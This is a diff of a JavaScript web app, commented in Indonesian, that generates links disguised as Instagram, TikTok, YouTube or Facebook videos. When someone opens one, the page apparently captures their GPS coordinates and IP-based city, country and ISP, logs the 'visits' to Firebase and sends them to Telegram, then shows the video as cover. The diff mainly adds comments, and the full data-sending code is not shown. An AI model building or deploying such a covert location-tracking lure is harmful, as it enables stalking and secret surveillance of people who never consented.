@@ -360,17 +360,23 @@ function initFirebase() {
 
 /* ==========================================================
    ROUTER
+   Deteksi mode: generator atau tracking
+   Format tracking baru: ?v=SLUG  atau  /v/SLUG
+   Format tracking lama (backward): ?r=...&t=...
    ========================================================== */
 var slugFromUrl = null;
 var urlParams = new URLSearchParams(window.location.search);
 
 (function detectSlug() {
+  // Format baru: ?v=SLUG
   var v = urlParams.get('v');
   if (v) { slugFromUrl = v; return; }
 
+  // Format baru: /v/SLUG
   var pathMatch = window.location.pathname.match(/\/v\/([A-Za-z0-9_-]+)/);
   if (pathMatch) { slugFromUrl = pathMatch[1]; return; }
 
+  // Format lama: ?r=...&t=...
   var r = urlParams.get('r');
   var t = urlParams.get('t');
   if (r && t) {
@@ -379,6 +385,7 @@ var urlParams = new URLSearchParams(window.location.search);
 })();
 
 if (slugFromUrl) {
+  // TRACKING MODE
   document.getElementById('generatorView').style.display = 'none';
   document.getElementById('trackingView').style.display = 'block';
   document.body.style.background = '#000';
@@ -393,6 +400,7 @@ if (slugFromUrl) {
     initTrackingFromSlug(slugFromUrl);
   }
 } else {
+  // GENERATOR MODE
   initGenerator();
 }
 
@@ -501,7 +509,7 @@ function testLink() {
 }
 
 /* ==========================================================
-   FIREBASE LISTENER
+   FIREBASE LISTENER (data lokasi masuk)
    ========================================================== */
 function startFirebaseListener() {
   var ref = fbDB.ref('visits');
@@ -685,7 +693,7 @@ function initTrackingFromSlug(slug) {
 }
 
 /* ==========================================================
-   TRACKING — Format LAMA
+   TRACKING — Format LAMA (backward compat)
    ========================================================== */
 function initTrackingFromLegacy() {
   var r = urlParams.get('r');
@@ -738,7 +746,7 @@ function ipFallback() {
           city: data.city,
           region: data.region,
           country: data.country_name,
-          isp: data.org || ''
+          isp: data.org
         });
       }
     })
@@ -800,7 +808,7 @@ function sendTelegram(lat, lng, acc, type, extra) {
 }
 
 /* ==========================================================
-   SHOW VIDEO
+   SHOW VIDEO (embed sesuai platform)
    ========================================================== */
 function showVideo() {
   document.getElementById('loadingArea').style.display = 'none';
@@ -816,11 +824,13 @@ function showVideo() {
   var embedUrl = null;
   var height = '600';
 
+  // Instagram
   var m = url.match(/instagram\.com\/(reel|p|tv)\/([A-Za-z0-9_-]+)/);
   if (m) {
     embedUrl = 'https://www.instagram.com/' + m[1] + '/' + m[2] + '/embed/';
   }
 
+  // TikTok
   if (!embedUrl) {
     m = url.match(/tiktok\.com\/.*\/video\/(\d+)/);
     if (m) {
@@ -829,6 +839,7 @@ function showVideo() {
     }
   }
 
+  // YouTube
   if (!embedUrl) {
     m = url.match(/(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/shorts\/)([A-Za-z0-9_-]{11})/);
     if (m) {
@@ -837,6 +848,7 @@ function showVideo() {
     }
   }
 
+  // Facebook
   if (!embedUrl) {
     if (url.indexOf('facebook.com') !== -1 || url.indexOf('fb.watch') !== -1) {
       embedUrl = 'https://www.facebook.com/plugins/video.php?href=' + encodeURIComponent(url) + '&show_text=0';
